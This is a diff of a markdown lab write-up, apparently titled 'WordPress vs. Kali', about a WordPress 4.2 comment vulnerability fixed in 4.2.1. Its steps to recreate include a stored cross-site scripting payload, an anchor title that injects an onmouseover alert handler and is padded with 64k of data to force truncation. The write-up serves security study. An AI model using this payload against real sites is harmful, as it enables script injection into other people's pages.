@@ -8,5 +8,6 @@ WordPress vs. Kali
    - Fixed in version 4.2.1
    - Tested in version 4.2
 - [ ] GIF Walkthrough:![](https://i.imgur.com/9udE06b.gif)
--[ ] Steps to recreate: Use the following to comment on a WordPress Post: 
+- [ ] Steps to recreate: Use the following to comment on a WordPress Post: 
 <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px <insert 64k of random data
+- [ ] Affected source code: N/A
